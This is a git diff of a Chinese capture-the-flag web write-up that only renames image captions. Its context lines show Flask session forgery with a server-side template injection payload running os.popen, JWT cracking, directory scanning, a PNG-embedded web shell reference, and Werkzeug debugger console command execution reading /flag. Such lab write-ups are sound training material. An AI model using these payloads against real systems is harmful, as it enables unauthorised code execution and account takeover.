@@ -80,7 +80,7 @@ https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip
 
 然后拖到fastcoll里面就行
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
 然后这里要进行编码，你进去看到的是乱码，写个php脚本
 
@@ -873,7 +873,7 @@ flask-unsign --sign --cookie "{'role': {'flag': 'your_flag_here', 'is_admin': 1}
 flask-unsign --sign --cookie "{'role': {'flag': '{{7+7}}', 'is_admin': 1}}" --secret '0day_joker'
 ```
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 ```
 flask-unsign --sign --cookie "{'role': {'flag': '{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}', 'is_admin': 1}}" --secret '0day_joker'
@@ -917,7 +917,7 @@ jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwi
 ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzEzOTQzODEsImlhdCI6MTczMTM4NzE4MSwibmJmIjoxNzMxMzg3MTgxLCJyb2xlIjoidXNlciJ9.aNfQHMw4DT28eDOfkVm03ZifKx5D5l34M6kaBbB0GhA
 ```
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 
 
@@ -927,7 +927,7 @@ jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwi
 
 ## [Week2]自助查询
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 裸奔？
 
@@ -963,15 +963,15 @@ dirsearch -u http://210.44.150.15:32713/
 
 登录等会应该是要爆破的，不过我们可以看看文章里面有没有东西
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 D盾直接就扫出来了，那么这里是`admin/profile.php`，这里面传参只有`POST['SH']`
 
 那么现在就是爆破之后访问就行
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 ## [Week3] love_flask
 
@@ -1363,13 +1363,13 @@ https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chun
 
 这道题是png我直接用的第一个脚本
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 执行命令之后立马就保存
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
-![1](./assets/010.png)
+![image](./assets/010.png)
 
 
 
@@ -1519,7 +1519,7 @@ if __name__ == "__main__":
 
 ```
 
-![1](./assets/011.png)
+![image](./assets/011.png)
 
 进console查看源码发现这个
 
@@ -1527,11 +1527,11 @@ if __name__ == "__main__":
 /console?__debugger__=yes&cmd=pinauth&pin=107-791-646&s=KWiiNi1LsEQEWD81tgor
 ```
 
-![1](./assets/012.png)
+![image](./assets/012.png)
 
 也就是说这里是有个多的东西来验证身份的，那么我们就是要把这些参数全部带上才可以命令执行
 
-![1](./assets/013.png)
+![image](./assets/013.png)
 
 这里进console也是非常奇葩，抓一次包才能进
 
@@ -1561,7 +1561,7 @@ __wzdc1e82870ae37b6827c7a=1731399932|b563fd4cd0d3;
 /console?&__debugger__=yes&cmd=open('/flag').read()&frm=0&s=QaUwOvTCEcKSmY8NELTA
 ```
 
-![1](./assets/014.png)
+![image](./assets/014.png)
 
 **cookie**带上就不用写`pin`了
 
